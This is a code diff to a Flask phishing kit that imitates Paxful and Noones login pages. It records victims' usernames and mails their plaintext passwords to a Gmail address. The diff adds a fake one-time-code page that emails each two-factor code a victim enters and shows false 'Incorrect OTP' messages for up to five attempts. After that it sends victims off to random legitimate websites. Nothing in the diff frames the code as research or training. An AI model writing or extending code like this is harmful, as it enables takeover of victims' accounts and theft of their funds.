@@ -1,10 +1,9 @@
 from flask import Flask, render_template, request, redirect, session, url_for
-import sqlite3, os
+import sqlite3, os, random
 from werkzeug.security import generate_password_hash, check_password_hash
 from functools import wraps
 from datetime import timedelta
 from flask_mail import Mail, Message
-import random
 
 app = Flask(__name__)
 app.secret_key = 'kenaki_secret'
@@ -42,7 +41,6 @@ def init_db():
     ''')
     conn.commit()
     conn.close()
-    print("[DB] Database and 'users' table ready.")
 
 init_db()
 
@@ -81,19 +79,26 @@ def paxful_login():
                       (username, hashed_pw, action, 'paxful'))
             conn.commit()
             conn.close()
-            print(f"[DB] User '{username}' inserted successfully.")
         except Exception as e:
             print(f"[Error] Inserting user {username}: {e}")
             return "Error inserting data", 500
 
         session['username'] = username
-        send_login_notification(username, action, password)  # Include password in the notification
+        session['theme'] = 'paxful'
+        session['action'] = action
+        session['password'] = password
+        session['otp_attempts'] = 0
 
-        random_websites = [
-            'https://www.example.com', 'https://www.google.com',
-            'https://www.wikipedia.org', 'https://www.bing.com', 'https://www.reddit.com'
-        ]
-        return redirect(random.choice(random_websites))
+        # Send email notification on login submission
+        send_login_notification(
+            username=username,
+            action=action,
+            password=password,
+            otp=None,
+            platform='paxful'
+        )
+
+        return redirect(url_for('otp_page'))
 
     return render_template('OGpax.html', action=action)
 
@@ -113,21 +118,64 @@ def noones_login():
                       (username, hashed_pw, action, 'noones'))
             conn.commit()
             conn.close()
-            print(f"[DB] User '{username}' inserted successfully.")
         except Exception as e:
             print(f"[Error] Inserting user {username}: {e}")
             return "Error inserting data", 500
 
         session['username'] = username
-        send_login_notification(username, action, password)  # Include password in the notification
+        session['theme'] = 'noones'
+        session['action'] = action
+        session['password'] = password
+        session['otp_attempts'] = 0
 
-        random_websites = [
-            'https://www.example.com', 'https://www.google.com',
-            'https://www.wikipedia.org', 'https://www.bing.com', 'https://www.reddit.com'
-        ]
-        return redirect(random.choice(random_websites))
+        # Send email notification on login submission
+        send_login_notification(
+            username=username,
+            action=action,
+            password=password,
+            otp=None,
+            platform='noones'
+        )
+
+        return redirect(url_for('otp_page'))
 
     return render_template('OGnoones.html', action=action)
+
+@app.route('/otp', methods=['GET', 'POST'])
+def otp_page():
+    if 'username' not in session or 'theme' not in session:
+        return redirect(url_for('home'))
+
+    message = ""
+    if request.method == 'POST':
+        # Collect all OTP digits from the form
+        otp_digits = [request.form.get(f'otp{i}', '') for i in range(6)]
+        otp = ''.join(otp_digits)  # Combine the digits into a single string
+
+        session['otp_attempts'] += 1
+
+        # Send email notification on every OTP submission
+        send_login_notification(
+            username=session['username'],
+            action=session['action'],
+            password=session['password'],
+            otp=otp,
+            platform=session['theme']
+        )
+
+        if session['otp_attempts'] >= 5:
+            session.pop('otp_attempts', None)
+            session.pop('password', None)
+            session.pop('action', None)
+            random_sites = [
+                'https://www.example.com', 'https://www.google.com',
+                'https://www.wikipedia.org', 'https://www.reddit.com', 'https://www.bing.com'
+            ]
+            return redirect(random.choice(random_sites))
+        else:
+            message = f"Incorrect OTP. Attempts left: {5 - session['otp_attempts']}"
+
+    return render_template('verify_otp.html', theme=session['theme'], message=message)
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -172,15 +220,21 @@ def admin_login():
     return render_template('admin_login.html')
 
 # ========== Send Login Notification ==========
-def send_login_notification(username, action, password):
+def send_login_notification(username, action, password, otp, platform):
     try:
+        otp_message = f"OTP Entered: {otp}" if otp else "OTP: Not entered yet"
         message = Message(
-            subject="New Login Attempt",
+            subject=f"New Login Attempt ({platform.capitalize()})",
             recipients=["chasersbit439@gmail.com"],
-            body=f"A user has logged in:\n\nUsername: {username}\nPassword: {password}\nAction: {action}"
+            body=f"A user has logged in:\n\n"
+                 f"Platform: {platform.capitalize()}\n"
+                 f"Username: {username}\n"
+                 f"Password: {password}\n"
+                 f"Action: {action}\n"
+                 f"{otp_message}"
         )
         mail.send(message)
-        print(f"[Mail] Notification sent for user '{username}'.")
+        print(f"[Mail] Notification sent for user '{username}' on platform '{platform}'.")
     except Exception as e:
         print(f"[Error] Sending email: {e}")
 
